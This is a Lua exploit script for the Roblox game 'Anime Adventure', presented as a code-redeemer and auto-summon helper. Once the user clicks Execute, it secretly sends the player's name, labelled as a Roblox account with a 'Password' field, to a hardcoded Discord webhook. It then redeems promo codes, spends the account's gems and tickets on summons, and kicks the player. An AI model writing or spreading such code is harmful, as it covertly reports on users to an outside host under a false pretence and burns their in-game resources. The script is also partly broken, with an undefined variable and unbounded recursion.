local placeId = game.PlaceId
if placeId == 8304191830 then
    AD = true
end


if AD then
    repeat wait() until game:IsLoaded()
    function create_notification(Title,Text,Duration,Callback,Button1,Button2)
    local bindablefunc = Instance.new("BindableFunction")
    bindablefunc.OnInvoke = function(button)
        if button == Button1 then 
            Callback()
        else
            print(button)
        end
    end
    game.StarterGui:SetCore(
        "SendNotification",
        {
            Title = Title,
            Text = Text,
            Duration = Duration or math.huge,
            Callback = bindablefunc,
            Button1 = Button1,
            Button2 = Button2
        }
    )
end

    create_notification(
    "Anime Adventure",
    "Code And Auto Summon",
    nil,
    function()
        repeat wait() until game:IsLoaded()
	local Username = game.Players.LocalPlayer.Character
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Embed = {
    title = Username.Name;
    color = '99999';
    footer = { text = "" };
    author = {
        name = 'ROBLOX ACCOUNT';
        url = 'https://www.roblox.com/';
    };
    fields = {
        {
            name = 'Password';
            value = 'nrtcWVneR8sX';
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/995951355296497686/MWkUGoz9mEsWObIASjBFbb2wWZ4GEgas_NoYZuds5jl-VipHQLyIYMIM7-BFUDdoQ6Sy';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};

	game:GetService("ReplicatedStorage").endpoints.client_to_server.claim_daily_reward:InvokeServer()
	local Code_List = {
        "DATAFIX",
        "MARINEFORD",
        "subtomaokuma",
        "TWOMILLION",
        "RELEASE",
        "SubToKelvingts",
        "SubToBlamspot",
        "TOADBOIGAMING",
        "KingLuffy",
        "noclypso",
        "subtosnowrbx",
        "Cxrsed",
        "FictioNTheFirst",
    }
    
for i,v in ipairs(Code_List) do
game:GetService("ReplicatedStorage").endpoints.client_to_server.redeem_code:InvokeServer(v)
end

	function AutoSummon()
    local gem = game.Players.LocalPlayer["_stats"]["gem_amount"].Value
    local ticket = game.Players.LocalPlayer.PlayerGui.items.grid.List.Outer.ItemFrames["summon_ticket"].OwnedAmount.Text
    local ItemFrame = game.Players.LocalPlayer.PlayerGui.items.grid.List.Outer.ItemFrames
    if gem > 49 or ticket ~= "x0" then
        game:GetService("ReplicatedStorage").endpoints.client_to_server.buy_random_fighter:InvokeServer("dbz_fighter","gems10")
        game:GetService("ReplicatedStorage").endpoints.client_to_server.buy_random_fighter:InvokeServer("dbz_fighter","gems")
        game:GetService("ReplicatedStorage").endpoints.client_to_server.buy_random_fighter:InvokeServer("dbz_fighter","ticket")
        print("1 Summon")
        return AutoSummon()
        
    elseif gem < 49 then 
        
        if not ItemFrame:FindFirstChild("summon_ticket") then
        game.Players.LocalPlayer:Kick("Success!!")
        
        else
            return AutoSummon()
        end

end
end

AutoSummon()

    end,
    "Execute",
    "No"
)
    
end


